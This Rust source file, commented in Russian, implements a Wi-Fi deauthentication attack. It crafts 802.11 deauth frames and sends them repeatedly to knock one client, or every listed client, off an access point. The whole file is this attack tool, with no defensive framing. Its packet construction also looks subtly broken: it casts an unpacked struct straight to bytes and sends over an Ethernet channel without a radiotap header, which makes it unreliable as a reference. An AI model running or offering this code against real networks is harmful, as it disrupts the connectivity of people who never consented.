use anyhow::Result;
use pnet::datalink::{self};
use log::info;

#[derive(Debug)]
struct DeauthPacket {
    frame_control: u16,
    duration: u16,
    destination: [u8; 6],
    source: [u8; 6],
    bssid: [u8; 6],
    sequence: u16,
    reason: u16,
}

impl DeauthPacket {
    fn new(destination: [u8; 6], source: [u8; 6], bssid: [u8; 6]) -> Self {
        DeauthPacket {
            frame_control: 0x00C0, // Type: Management, Subtype: Deauthentication
            duration: 0,
            destination,
            source,
            bssid,
            sequence: 0,
            reason: 0x0007, // Class 3 frame received from nonassociated station
        }
    }
}

/// Отправка деаутентификационного пакета
pub fn send_deauth(interface: &str, target_mac: [u8; 6], ap_mac: [u8; 6]) -> Result<()> {
    // Получаем сетевой интерфейс
    let interfaces = datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .find(|iface| iface.name == interface)
        .ok_or_else(|| anyhow::anyhow!("Interface not found"))?;

    // Создаем канал для отправки пакетов
    let (mut tx, _) = match datalink::channel(&interface, Default::default()) {
        Ok(datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => return Err(anyhow::anyhow!("Unsupported channel type")),
        Err(e) => return Err(anyhow::anyhow!("Error creating channel: {}", e)),
    };

    // Создаем и отправляем пакеты
    let deauth_packet = DeauthPacket::new(target_mac, ap_mac, ap_mac);
    let packet_bytes = unsafe {
        std::slice::from_raw_parts(
            &deauth_packet as *const _ as *const u8,
            std::mem::size_of::<DeauthPacket>(),
        )
    };

    // Отправляем пакет несколько раз для надежности
    for _ in 0..10 {
        match tx.send_to(packet_bytes, None) {
            Some(Ok(_)) => (),
            Some(Err(e)) => return Err(anyhow::anyhow!("Failed to send packet: {}", e)),
            None => return Err(anyhow::anyhow!("Failed to send packet: channel closed")),
        }
        std::thread::sleep(std::time::Duration::from_millis(100));
    }

    Ok(())
}

/// Деаутентификация всех клиентов точки доступа
pub fn deauth_all_clients(interface: &str, ap_mac: [u8; 6], clients: &[[u8; 6]]) -> Result<()> {
    for client in clients {
        info!("Отправка деаутентификационного пакета клиенту {:02X?}", client);
        send_deauth(interface, *client, ap_mac)?;
    }
    Ok(())
} 